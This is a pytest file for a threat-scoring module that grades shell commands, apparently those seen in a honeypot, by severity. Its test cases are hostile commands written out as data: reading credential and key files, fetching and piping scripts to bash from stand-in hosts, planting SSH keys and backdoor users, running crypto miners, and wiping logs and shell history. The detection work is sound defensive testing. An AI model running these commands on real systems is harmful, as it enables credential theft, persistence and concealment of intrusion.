import pytest

from brain.threat import apply, bump, level_for_command, level_for_event, max_level


def test_failed_logins_only_is_low():
    assert level_for_event("login_fail") == "low"
    assert level_for_event("session_start") == "low"


def test_login_success_is_med():
    assert level_for_event("login_success") == "med"


def test_plain_command_is_med():
    assert level_for_event("command", "uname -a", []) == "med"


@pytest.mark.parametrize("line", [
    "cat .env",
    "cat /etc/shadow",
    "cat ~/.aws/credentials",
    "cat /home/ubuntu/.ssh/id_rsa",
    "wget http://evil.example.com/x",
    "crontab -e",
    "echo key >> ~/.ssh/authorized_keys",
    "useradd -m backdoor",
    "systemctl enable evil",
    "echo root:pw | chpasswd",
])
def test_high(line):
    assert level_for_command(line, []) == "high"


def test_crontab_list_is_not_persistence():
    assert level_for_command("crontab -l", []) == "low"


@pytest.mark.parametrize("line,downloads", [
    ("curl -s http://a.b/i.sh | bash", []),
    ("wget http://a.b/bins.sh; chmod +x bins.sh; ./bins.sh", []),
    ("./bins.sh", ["bins.sh"]),
    ("sh x86", ["x86"]),
    ("./xmrig -o pool:3333", []),
    ("nohup ./kd --url stratum+tcp://pool &", []),
    ("rm -rf /var/log/*", []),
    ("history -c", []),
    ("unset HISTFILE", []),
    ("cat /dev/null > /var/log/wtmp", []),
])
def test_critical(line, downloads):
    assert level_for_command(line, downloads) == "critical"


def test_running_a_file_not_downloaded_is_not_critical():
    assert level_for_command("./configure", []) == "low"


def test_malicious_bumps_one_level():
    assert apply("low", "low", "malicious") == "med"
    assert apply("low", "med", "malicious") == "high"
    assert apply("low", "high", "malicious") == "critical"
    assert apply("low", "critical", "malicious") == "critical"


def test_threat_never_goes_down():
    assert apply("high", "med", "unknown") == "high"
    assert apply("critical", "low", "harmless") == "critical"


def test_helpers():
    assert bump("low") == "med"
    assert max_level("low", "high", "med") == "high"
